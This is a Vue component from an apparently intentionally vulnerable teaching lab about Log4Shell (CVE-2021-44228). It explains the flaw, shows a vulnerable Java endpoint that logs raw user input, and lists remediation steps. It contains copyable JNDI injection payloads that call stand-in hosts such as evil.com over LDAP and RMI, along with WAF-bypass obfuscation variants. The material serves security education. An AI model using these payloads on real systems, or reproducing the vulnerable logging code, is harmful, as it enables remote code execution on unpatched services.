<template>
  <vuln-template
    title="日志组件远程执行"
    subtitle="日志注入远程执行"
    level="严重"
    :icon="FileProtectOutlined"
    moduleKey="log4j"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>Log4Shell (CVE-2021-44228)</strong> 是Log4j2中的JNDI注入漏洞,被评为近年来最严重的漏洞之一。
      </a-typography-paragraph>
      <a-typography-paragraph>
        Log4j漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过JNDI注入远程加载恶意类</li>
        <li>无需认证即可触发</li>
        <li>影响范围极广(几乎所有Java应用)</li>
        <li>远程代码执行,危害巨大</li>
      </ul>
      <a-typography-paragraph>
        漏洞版本：Log4j 2.0 - 2.14.1
      </a-typography-paragraph>
    </template>

    <template #payload>
      <a-typography-paragraph>
        经典的Log4Shell payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        ${jndi:ldap://evil.com/Exploit}
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过LDAP协议加载远程恶意类</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">
        ${jndi:rmi://evil.com/Exploit}
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过RMI协议加载远程恶意类</span>
      </a-space>

      <a-typography-paragraph code copyable style="margin-top: 12px">
        ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/Exploit}
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">绕过WAF的混淆payload</span>
      </a-space>

      <a-alert
        message="立即升级到Log4j 2.17.0+版本！"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <div class="logging-container">
        <a-card title="日志记录功能" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            输入日志内容，系统将使用Log4j记录日志。支持变量替换功能。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="日志内容"
            name="payload"
            :rules="[{ required: true, message: '请输入日志内容' }]"
          >
            <a-input
              v-model:value="formState.payload"
              size="large"
              placeholder="例如：用户登录失败，用户名：${jndi:ldap://example.com/a}"
              prefix="📝"
            />
            <div style="margin-top: 8px; color: #8c8c8c; font-size: 12px;">
              支持使用 ${} 语法进行变量替换
            </div>
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><file-protect-outlined /></template>
                记录日志
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #input-hint>
      <a-alert message="测试建议" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>Log4Shell测试payload：</strong></p>
      <ul style="padding-left: 20px; margin-bottom: 12px;">
        <li><a-typography-text code copyable>${jndi:ldap://your-server.com/Exploit}</a-typography-text> - LDAP协议</li>
        <li><a-typography-text code copyable>${jndi:rmi://your-server.com/Exploit}</a-typography-text> - RMI协议</li>
      </ul>
      <p><strong>绕过WAF的混淆技巧：</strong></p>
      <ul style="padding-left: 20px; margin-bottom: 0;">
        <li><code>${${::-j}ndi:ldap://...}</code> - 使用::-j绕过</li>
        <li><code>${${lower:j}ndi:ldap://...}</code> - 使用lower函数</li>
        <li><code>${j${upper:n}di:ldap://...}</code> - 混合使用函数</li>
      </ul>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/log4j")
public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);
    
    @RequestMapping("")
    public String log4j(String content) {
        // 漏洞：直接记录用户输入的内容
        // Log4j2会解析日志中的${}表达式，如果包含${jndi:ldap://...}会触发JNDI查找
        // 攻击者可以通过JNDI注入加载远程恶意类，实现远程代码执行
        logger.error(content);
        return "Log4j2 JNDI Injection";
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：Log4j2默认会解析日志消息中的${}表达式。攻击者可以输入${jndi:ldap://evil.com/Exploit}，Log4j2会通过JNDI查找加载远程恶意类，实现远程代码执行。这是CVE-2021-44228（Log4Shell）漏洞。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>立即升级：</strong>升级到Log4j 2.17.1或更高版本（最优方案）</li>
        <li><strong>移除JNDI Lookup：</strong>从classpath中删除JndiLookup类</li>
        <li><strong>禁用lookup：</strong>设置log4j2.formatMsgNoLookups=true</li>
        <li><strong>JVM参数：</strong>添加-Dlog4j2.formatMsgNoLookups=true启动参数</li>
        <li><strong>输入验证：</strong>过滤日志中的${}表达式</li>
        <li><strong>WAF规则：</strong>添加WAF规则过滤${jndi:模式</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
logger.error(userInput); // 如果userInput包含${jndi:ldap://...}会触发漏洞</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：升级Log4j版本（推荐）
        // 在pom.xml中升级到安全版本
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.17.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.17.1&lt;/version&gt;
&lt;/dependency&gt;</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：JVM启动参数禁用lookup
        // 在JVM启动参数中添加：
        java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
        
        // 或者在代码中设置系统属性
System.setProperty("log4j2.formatMsgNoLookups", "true");</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：输入验证和过滤
        @RequestMapping("")
        public String log4j(String content) {
            // 过滤${}表达式
            if (content != null && content.contains("${")) {
                // 移除或转义${}表达式
        content = content.replace("${", "\\\\${");
            }
            
            logger.error(content);
            return "Log4j2 JNDI Injection";
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：删除JndiLookup类（临时方案）
        // 从log4j-core jar包中删除JndiLookup类
        zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
        
        // 或者在运行时检测并拒绝加载
        if (System.getProperty("log4j2.formatMsgNoLookups") == null) {
            System.setProperty("log4j2.formatMsgNoLookups", "true");
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode6" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例5：使用log4j配置文件禁用lookup
        // 在log4j2.xml中配置：
        &lt;Configuration status="WARN"&gt;
            &lt;Appenders&gt;
                &lt;Console name="Console" target="SYSTEM_OUT"&gt;
                    &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/&gt;
                &lt;/Console&gt;
            &lt;/Appenders&gt;
            &lt;Loggers&gt;
                &lt;Root level="error"&gt;
                    &lt;AppenderRef ref="Console"/&gt;
                &lt;/Root&gt;
            &lt;/Loggers&gt;
        &lt;/Configuration&gt;
        
// 并在JVM参数中设置：-Dlog4j2.formatMsgNoLookups=true</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { FileProtectOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/log4j")
public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);
    
    @RequestMapping("")
    public String log4j(String content) {
        // 漏洞：直接记录用户输入的内容
        // Log4j2会解析日志中的\${}表达式，如果包含\${jndi:ldap://...}会触发JNDI查找
        // 攻击者可以通过JNDI注入加载远程恶意类，实现远程代码执行
        logger.error(content);
        return "Log4j2 JNDI Injection";
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
logger.error(userInput); // 如果userInput包含\${jndi:ldap://...}会触发漏洞`

const fixCode2 = `// 正确示例1：升级Log4j版本（推荐）
// 在pom.xml中升级到安全版本
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.17.1</version>
</dependency>`

const fixCode3 = `// 正确示例2：JVM启动参数禁用lookup
// 在JVM启动参数中添加：
java -Dlog4j2.formatMsgNoLookups=true -jar app.jar

// 或者在代码中设置系统属性
System.setProperty("log4j2.formatMsgNoLookups", "true");`

const fixCode4 = `// 正确示例3：输入验证和过滤
@RequestMapping("")
public String log4j(String content) {
    // 过滤\${}表达式
    if (content != null && content.contains("\${")) {
        // 移除或转义\${}表达式
        content = content.replace("\${", "\\\\\\\\\${");
    }
    
    logger.error(content);
    return "Log4j2 JNDI Injection";
}`

const fixCode5 = `// 正确示例4：删除JndiLookup类（临时方案）
// 从log4j-core jar包中删除JndiLookup类
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

// 或者在运行时检测并拒绝加载
if (System.getProperty("log4j2.formatMsgNoLookups") == null) {
    System.setProperty("log4j2.formatMsgNoLookups", "true");
}`

const fixCode6 = `// 正确示例5：使用log4j配置文件禁用lookup
// 在log4j2.xml中配置：
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="error">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>

// 并在JVM参数中设置：-Dlog4j2.formatMsgNoLookups=true`

const formState = reactive({
  payload: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/log4j', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.payload = ''
  result.value = ''
}
</script>
